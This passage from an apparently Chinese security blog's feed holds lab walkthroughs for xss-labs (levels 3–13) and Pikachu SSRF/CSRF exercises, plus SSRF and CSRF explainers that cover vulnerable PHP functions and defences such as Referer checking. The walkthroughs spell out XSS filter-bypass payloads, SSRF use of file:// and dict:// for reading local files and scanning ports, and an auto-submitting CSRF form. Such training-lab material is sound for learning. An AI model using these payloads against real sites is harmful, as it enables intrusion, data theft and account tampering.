class="string">&#x27;)%20</span></span><br></pre></td></tr></table></figure></li><li>onfocus的作用是当点击输入框的时候会触发指令</li><li><code>&#39;</code>的作用是闭合value的值</li><li><code>%20</code>是url编码的空格，用于与后面语句隔开<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015153542.png" alt="image.png"></li></ul><h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><ul><li>看起来又和前面一样，尝试再来一次<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015153735.png" alt="image.png"></li><li>发现和前面不一样的是，这次是双引号</li><li>把单引号改成双引号就行<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015153854.png" alt="image.png"></li></ul><h1 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015153947.png" alt="image.png"></p><ul><li>用相同的方法发现不行，onfocus中间被奇怪的符号隔开了，用<code>&lt;script&gt;</code>也是这样</li><li>应该是这几个关键词被过滤了，那就有其他的关键词</li><li><code>&lt;a&gt;</code>是超链接，应该可以用<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015154845.png" alt="image.png"></li></ul><h1 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015155015.png" alt="image.png"></p><ul><li>用相同的方法，发现href也被过滤了</li><li>那尝试一下大小写吧<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015155110.png" alt="image.png"></li><li>立马就成功了</li></ul><h1 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015155201.png" alt="image.png"></p><ul><li>相同的方法，发现中间的很多字符消失了</li><li>猜测是被识别过滤了</li><li>尝试双写绕过<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015155334.png" alt="image.png"></li></ul><h1 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015155404.png" alt="image.png"></p><ul><li>这题和之前看起来有一点点不一样，有个友情链接的超链接，点了发现是404<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015155446.png" alt="image.png"></li><li>用查看器一看，发现超链接的目标就是输入框的内容</li><li>那么就在输入框当中输入语句<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015155735.png" alt="image.png"></li><li>发现script还是被过滤了，前面用过的都被过滤了</li><li>所以尝试用编码绕过</li><li>这里使用Unicode编码，使用<a href="https://c.runoob.com/front-end/3602/">Unicode在线转换工具</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015160536.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015160617.png" alt="image.png"></li><li>通过unicode编码绕过了过滤机制</li></ul><h1 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h1><ul><li>看起来和上一题一样，输入语句，发现不合法<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015160732.png" alt="image.png"></li><li>这里一直没搞明白，就去看看源代码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015160856.png" alt="image.png"></li><li>在源代码中，看见有一个过滤机制，<a href="https://www.runoob.com/php/func-string-strpos.html">strpos()用法</a></li><li>用于检测是否包含指定字符，这里是检测是否包含<code>http://</code></li><li>我们只需要在背后加上<code>http://</code>，并且用<code>//</code>放前面注释掉它就行<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#<span class="number">106</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">118</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">99</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">105</span>;&amp;#<span class="number">112</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">58</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">108</span>;&amp;#<span class="number">101</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">40</span>;&amp;#<span class="number">39</span>;&amp;#<span class="number">49</span>;&amp;#<span class="number">39</span>;&amp;#<span class="number">41</span>;<span class="comment">//http://</span></span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015161444.png" alt="image.png"></li></ul><h1 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015161616.png" alt="image.png"></p><ul><li>这一关和前面的都不一样，没有输入框也没有按钮</li><li>用查看器看，发现多了几个参数<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015161607.png" alt="image.png"></li><li>尝试一下能不能通过get传递到服务器<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss-labs/level10.php?keyword=well done!&amp;t_link=1&amp;t_history=2&amp;t_sort=3</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015161806.png" alt="image.png"></li><li>发现<code>t_sort</code>的参数发生了变化，变成我们设定的数字</li><li>我们就可以在这里插入我们的语句<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015161958.png" alt="image.png"></li><li>发现尖括号又被过滤了，那么只能使用能在尖括号当中的语句了</li><li>如果是用上面用过的onfocus的话，没有输入框，难以触发</li><li>所以我们应该需要将内容显现出来，然后添加触发按钮<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_sort=<span class="string">&quot; type=&quot;</span>text<span class="string">&quot; onclick=&quot;</span><span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015162428.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015162437.png" alt="image.png"></li></ul><h1 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h1><ul><li>和上题一样，通过查看器发现多了一个参数<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015162605.png" alt="image.png"></li><li><code>ref</code>猜测是referer，再看后面的值，基本确定就是referer</li><li>所以我们在传递referer当中插入我们的代码就行<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;1&#x27;)</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015162829.png" alt="image.png"></li></ul><h1 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h1><ul><li>同样发现有一个特殊的参数<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015162922.png" alt="image.png"></li><li>通过t_ua这个名字，以及后面的参数，猜测应该是user agent<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015163038.png" alt="image.png"></li></ul><h1 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015163105.png" alt="image.png"></p><ul><li>cook猜测是cookie信息<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;1&#x27;)</span><br></pre></td></tr></table></figure></li><li>前面需要加<code>user=</code>，表示cookie信息当中的用户<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015163321.png" alt="image.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> XSS </tag>
            
            <tag> xss-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF服务端请求伪造攻击</title>
      <link href="/2023/10/13/SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/"/>
      <url>/2023/10/13/SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF-简介"><a href="#SSRF-简介" class="headerlink" title="SSRF 简介"></a>SSRF 简介</h1><ul><li>SSRF（Server-Side Request Forgery，服务端请求伪造），是攻击者让服务端发起构造的指定请求链接造成的漏洞。  </li><li>由于存在防火墙的防护，导致攻击者无法直接入侵内网；这时攻击者可以以服务器为跳板发起一些网络请求，从而攻击内网的应用及获取内网数据。</li></ul><h1 id="SSRF与CSRF的区别"><a href="#SSRF与CSRF的区别" class="headerlink" title="SSRF与CSRF的区别"></a>SSRF与CSRF的区别</h1><ul><li>CSRF是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的cookie信息伪造用户请求发送至服务器；</li><li>SSRF是服务器对用户提供的可控URL过于信任，没有对攻击者提供的URL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或者其它服务器。</li></ul><h1 id="SSRF-原理"><a href="#SSRF-原理" class="headerlink" title="SSRF 原理"></a>SSRF 原理</h1><ul><li>SSRF形成的原因大都是由于服务端提供了从其他服务器或应用中获取数据的功能，但没有对目标地址做出有效的过滤与限制造成的。</li><li>比如，一个正常的Web应用，本应该从指定URL获取网页文本内容或加载指定地址的图片，而攻击者利用漏洞伪造服务器端发出请求，从而突破了客户端获取不到数据的限制，如内网资源、服务器本地资源等。</li></ul><h1 id="SSRF-漏洞利用手段"><a href="#SSRF-漏洞利用手段" class="headerlink" title="SSRF 漏洞利用手段"></a>SSRF 漏洞利用手段</h1><ul><li>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。</li><li>攻击运行在内网或本地的应用程序。</li><li>对内网Web应用进行指纹识别，识别企业内部的资产信息。</li><li>攻击内外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如struts2、SQli等)。</li><li>利用file协议读取本地文件等。</li><li>漏洞产生相关函数：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>()、<span class="title function_ invoke__">fsockopen</span>()、<span class="title function_ invoke__">curl_exec</span>()、<span class="title function_ invoke__">fopen</span>()、<span class="title function_ invoke__">readfile</span>()</span><br></pre></td></tr></table></figure></li></ul><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h2><ul><li><code>file_get_content</code>函数从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户。<code>file_put_content</code>函数把一个字符串写入文件中。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h2><ul><li><code>fsockopen</code>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span>&#123; </span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);   </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; </span><br><span class="line">            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h2><ul><li><code>curl_exec</code>函数用于执行指定的curl会话<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();<span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);<span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);<span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><strong>注意：</strong></li></ul><ol><li>一般情况下PHP不会开启fopen的gopher wrapper</li><li>file_get_contents的gopher协议不能URL编码</li><li>file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</li><li>curl&#x2F;libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用</li><li>curl_exec() 默认不跟踪跳转，</li><li>file_get_contents() 支持php:&#x2F;&#x2F;input协议</li></ol><h1 id="Pikachu-SSRF实验练习"><a href="#Pikachu-SSRF实验练习" class="headerlink" title="Pikachu-SSRF实验练习"></a>Pikachu-SSRF实验练习</h1><h2 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h2><ul><li>可以先看看<a href="https://www.runoob.com/php/php-ref-curl.html">curl的用法</a>，因为我也不是很懂这个curl</li><li>PHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。</li><li>libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP基于表单的上传、代理、cookies和用户名+密码的认证。</li><li>进入到页面，可以看到一个链接，我们点击它<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013220530.png" alt="image.png"></li><li>应该会出现“假如生活欺骗了你”的内容，但是我这里文件丢失了，<strong>请无视</strong>，不影响后续操作</li><li>我们可以看到url地址<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013220549.png" alt="image.png"></li><li>因为curl支持多种协议，我们尝试一下</li></ul><h3 id="通过网站访问链接"><a href="#通过网站访问链接" class="headerlink" title="通过网站访问链接"></a>通过网站访问链接</h3><ul><li>我们直接把后面的url改成百度的网址，很鬼畜，居然重合了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013220838.png" alt="image.png"></li></ul><h3 id="利用file协议查看本地文件"><a href="#利用file协议查看本地文件" class="headerlink" title="利用file协议查看本地文件"></a>利用file协议查看本地文件</h3><ul><li>直接把url修改成本地文件的地址，就可以查看文件内容<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013221050.png" alt="image.png"></li></ul><h3 id="dict协议扫描内网主机开放端口"><a href="#dict协议扫描内网主机开放端口" class="headerlink" title="dict协议扫描内网主机开放端口"></a>dict协议扫描内网主机开放端口</h3><ul><li>连接上开放的端口，我这里是链接了MySQL数据库<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013222152.png" alt="image.png"></li></ul><h2 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h2><ul><li>同样可以先了解了解<a href="https://www.runoob.com/php/func-filesystem-file-get-contents.html">file_get_content()的用法</a></li><li>和上一题差不多，不过url换成了file<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013222415.png" alt="image.png"></li></ul><h3 id="file读取本地文件"><a href="#file读取本地文件" class="headerlink" title="file读取本地文件"></a>file读取本地文件</h3><ul><li>输入本地文件地址，可以查看本地文件内容<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013223622.png" alt="image.png"></li></ul><h3 id="http协议请求内网资源"><a href="#http协议请求内网资源" class="headerlink" title="http协议请求内网资源"></a>http协议请求内网资源</h3><ul><li>也可以通过http访问内网的资源<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013224657.png" alt="image.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pikachu-CSRF跨站请求伪造练习</title>
      <link href="/2023/10/13/Pikachu-CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E7%BB%83%E4%B9%A0/"/>
      <url>/2023/10/13/Pikachu-CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="第一关-CSRF-get"><a href="#第一关-CSRF-get" class="headerlink" title="第一关 CSRF(get)"></a>第一关 CSRF(get)</h1><ul><li><p>看标题知道这是个get请求的csrf</p></li><li><p>我们点击提示可以看到受信任的用户名和密码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013192453.png" alt="image.png"></p></li><li><p>登录其中一个<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013192510.png" alt="image.png"></p></li><li><p>我们现在模拟allen修改信息</p></li><li><p>点击修改个人信息</p></li><li><p>随便修改一项，我这里修改了邮箱</p></li><li><p>同时进行抓包<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013192645.png" alt="image.png"></p></li><li><p>确定是get请求</p></li><li><p>我们可以对这条get请求做手脚</p></li><li><p>比如把性别改成女的（666纯纯恶搞）<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013192815.png" alt="image.png"></p></li><li><p>这个操作在真实案例当中应该是由链接触发的，这只是模拟</p></li></ul><h1 id="第二关-CSRF-post"><a href="#第二关-CSRF-post" class="headerlink" title="第二关 CSRF(post)"></a>第二关 CSRF(post)</h1><ul><li>看题目知道是post类型的</li><li>通过提示登录进去<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013193323.png" alt="image.png"></li><li>与上面的方法一样，也是模拟用户修改信息，然后抓包修改</li><li>抓到了post包，模拟链接修改这段<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013193439.png" alt="image.png"></li><li>再次将这个人改成女的<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013193604.png" alt="image.png"></li></ul><h1 id="第三关-CSRF-Token"><a href="#第三关-CSRF-Token" class="headerlink" title="第三关 CSRF Token"></a>第三关 CSRF Token</h1><ul><li>与上面的两个一样，还是先登录受信任的用户</li><li>然后修改信息，我这里还是修改邮箱<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013202216.png" alt="image.png"></li><li>这里可以看见，在get包当中有token值，是令牌用于鉴别身份的</li><li>我们需要盗取token</li><li>我们将这个get包放入重发器当中，我们发现token发生了变化，所以我们需要使用新的token，原来那个会失效<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013202321.png" alt="image.png"></li><li>我们将新的token复制到get包当中替换，然后修改信息，我这里还是改了boy</li><li>可以看见成功了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013202451.png" alt="image.png"></li><li>回到页面可以看见改成boy了，说明修改成功<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231013202617.png" alt="image.png"></li><li>希望以上的三个练习可以帮助你更好的学习CSRF攻击</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> csrf </tag>
            
            <tag> pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF跨站域请求伪造攻击</title>
      <link href="/2023/10/13/CSRF%E8%B7%A8%E7%AB%99%E5%9F%9F%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/"/>
      <url>/2023/10/13/CSRF%E8%B7%A8%E7%AB%99%E5%9F%9F%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF简介"><a href="#CSRF简介" class="headerlink" title="CSRF简介"></a>CSRF简介</h1><ul><li>CSRF（Cross Site Request Forgery，跨站域请求伪造），也被称为 “One Click Attack” 或者 Session Riding，通常缩写为 CSRF 或者 XSRF 。</li><li>尽管听起来像跨站脚本（XSS），但它与XSS非常不同，并且攻击方式几乎相左。XSS 利用站点内的信任用户，而 CSRF 则通过伪装成来自受信任用户的请求来利用受信任的网站。</li></ul><h1 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h1><ul><li>首先是存在CSRF漏洞的网站A，以及存在恶意攻击代码的网站B，还有受网站A信任的用户C</li></ul><ol><li>用户C通过浏览器正常访问网站A，</li><li>通过验证在浏览器生成cookie信息</li><li>用户C在没有登出网站A的情况下，访问网站B</li><li>网站B返回给用户一些攻击性代码，并请求访问网站A</li><li>这样网站B就在用户不知情的情况下，利用浏览器保存的cookie信息对网站A进行访问请求，导致网站B的恶意代码能够在网站A被信任执行</li></ol><ul><li>需要满足两个条件：</li></ul><ol><li>登录受信任网站A，并生成cookie</li><li>不登出网站A的情况下，访问网站B</li></ol><h1 id="CSRF危害"><a href="#CSRF危害" class="headerlink" title="CSRF危害"></a>CSRF危害</h1><ul><li>你不能保证你登录了一个网站后，不再打开一个 tab 页面并访问另外的网站。</li><li>你不能保证你关闭浏览器了后，你本地的 Cookie 立刻过期，你上次的会话已经结束。（事实上，关闭浏览器不能结束一个会话，但大多数人都会错误的认为关闭浏览器就等于退出登录&#x2F;结束会话了…）</li><li>上面所谓的攻击网站，可能是一个存在其他漏洞的可信任的经常被人访问的网站。</li><li>攻击者盗用用户身份进行恶意行为，包括以他人名义发送邮件，盗取账户，购买商品等等</li><li>更重要的是个人隐私的泄露以及财产安全</li></ul><h1 id="CSRF攻击类型"><a href="#CSRF攻击类型" class="headerlink" title="CSRF攻击类型"></a>CSRF攻击类型</h1><h2 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h2><ul><li>通过GET请求进行修改</li><li>比如用户修改邮箱是通过GET请求修改的，例如<code>/user.php?id=1&amp;email=123@163.com</code></li><li>意思是用户id为1的用户需要修改邮箱为<code>123@163.com</code></li><li>那么恶意网站当中有一段代码内容，例如<code>&lt;img src=/user.php?id=1&amp;email=abc@163.com&gt;</code></li><li>那么，只需要用户在打开修改邮箱的同时打开了这个恶意网站，那么浏览器就会带上用户的cookie信息向修改邮箱的网站发出GET请求，导致该用户的邮箱被修改成了<code>abc@163.com</code></li></ul><h2 id="POST型"><a href="#POST型" class="headerlink" title="POST型"></a>POST型</h2><ul><li>POST型相较于GET型来说，危害没那么大，通常是使用一个自动提交表单</li><li>例如在购买商品时，网站会处理购买时用户余额的扣除，会在一个地址内进行，如<code>/coures/user/handler/25332/buy.php</code></li><li>通过提交表单在buy.php当中处理扣除信息<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">/coures/user/handler/25332/buy</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;xx&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xx&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure></li><li>访问该页面，表单会自动提交，相当于模拟用户提交一次POST</li></ul><h1 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h1><h2 id="验证HTTP-Referer字段"><a href="#验证HTTP-Referer字段" class="headerlink" title="验证HTTP Referer字段"></a>验证HTTP Referer字段</h2><ul><li>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址 。</li><li>在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问<code> http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</code>，用户必须先登陆 <code>bank.example</code>，然后通过点击页面上的按钮来触发转账事件。</li><li>因此，要防御 CSRF 攻击，网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</li></ul><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul><li>这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。</li></ul><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ol><li>然而，这种方法并非万无一失。Referer 